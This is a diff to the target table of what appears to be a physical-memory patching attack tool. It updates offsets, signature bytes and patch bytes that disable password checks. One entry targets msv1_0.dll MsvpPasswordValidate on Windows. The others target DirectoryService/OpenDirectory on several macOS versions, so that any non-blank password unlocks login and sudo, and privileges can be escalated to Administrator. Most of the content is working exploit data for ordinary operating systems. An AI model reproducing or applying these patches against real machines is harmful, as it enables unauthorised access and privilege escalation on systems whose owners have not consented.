@@ -155,7 +155,7 @@ targets=[{'OS': 'Windows 7',
           'versions': ['SP2', 'SP3'],
           'architectures': ['x86'],
           'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
-          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password. The XP2 technique patches the call which decides if an account requires password authentication, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
+          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
           'signatures': [{'offsets': [0x862, 0x8aa, 0x946, 0x126, 0x9b6], # SP2-3 x86
                           'chunks': [{'chunk': 0x83f8107511b0018b,
                                       'internaloffset': 0x00,
@@ -165,21 +165,21 @@ targets=[{'OS': 'Windows 7',
           'versions': ['10.6.4', '10.6.8', '10.7.3'],
           'architectures': ['x32', 'x64'],
           'name': 'DirectoryService/OpenDirectory unlock/privilege escalation',
-          'notes': 'Overwrites DoShadowHashAuth/ODRecordVerifyPassword return value. After running, all local authentications (e.g., GUI, sudo, etc.) will work with all non-blank password',
+          'notes': 'Overwrites DoShadowHashAuth/ODRecordVerifyPassword return value. After running, all local authentications (e.g., GUI, sudo, etc.) will work with all non-blank passwords',
           'signatures': [{'offsets': [0x7cf], # 10.6.4 x64
                           'chunks': [{'chunk': 0x41bff6c8ffff48c78588,
                                       'internaloffset': 0x00,
                                       'patch': 0x41bf0000000048c78588,
                                       'patchoffset': 0x00}]},
-                         {'offsets': [0xf63], # 10.6.8 x64
-                          'chunks': [{'chunk': 0x41bf60c8ffffe9,
+                         {'offsets': [0xbff], # 10.6.8 x64
+                          'chunks': [{'chunk': 0x41bf60c8ffff,
                                       'internaloffset': 0x00,
-                                      'patch': 0x41bf00000000e9,
+                                      'patch': 0x41bf00000000,
                                       'patchoffset': 0x00}]},
-                         {'offsets': [0x4a2], # 10.6.8 x32
-                          'chunks': [{'chunk': 0xc78580f6ffff60c8ffffe9,
+                         {'offsets': [0x82f], # 10.6.8 x32
+                          'chunks': [{'chunk': 0xc78580f6fffff6c8ffff,
                                       'internaloffset': 0x00,
-                                      'patch': 0xc78580f6ffff00000000e9,
+                                      'patch': 0xc78580f6ffff00000000,
                                       'patchoffset': 0x00}]},
                          {'offsets': [0xfa7], # 10.7.3 x64
                           'chunks': [{'chunk': 0x0fb6,
